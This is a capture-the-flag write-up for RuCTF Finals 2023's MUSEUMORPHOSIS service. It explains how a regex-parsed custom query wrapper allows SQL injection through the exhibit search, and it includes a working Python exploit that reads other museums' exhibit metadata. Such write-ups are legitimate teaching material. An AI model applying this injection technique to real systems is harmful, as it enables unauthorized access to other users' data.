# RuCTF Finals 2023 | MUSEUMORPHOSIS

## Description

The service was named by ChatGPT :^) \
It provides a service to create your own museum and store exhibits in it

## Execution flow

Code of program using self-written database/sql driver, which wrapped over SQL queries.
For Example - this custom query exec `query` in database with id `db_id`:
```
QUERY ( <query> ) AT DATABASE ( <db_id> )
```

Parsing of custom queries realized by bad [regular expressions](/services/museumorphosis/pkg/fsql/queries/query/query.go), which can lead to injection

Note, that one of the queries in service is:
```
QUERY ( SELECT * FROM exhibits WHERE title LIKE '%<user_input>%' ) AT DATABASE (<db>)
```
We can exploit it this way:
```python
import requests

def main():
    api_url = f"http://{IP}:{PORT}/api"
    museum_id, exhibit_id = ...

    hacker_token = requests.post(
        f"{api_url}/register",
        json={"name": "cool_haцker", "password": "123"}
    ).json()["token"]

    injection_search = f"' AND id = '{exhibit_id}') AT DATABASE ({museum_id})"
    # also can extract all someone else exhibits

    resp = requests.get(
        f"{api_url}/museum/exhibits?search={injection_search}",
        headers={"token": hacker_token},
    ).json()
    print(resp["exhibits"][0]["metadata"])


if __name__ == '__main__':
    main()
```
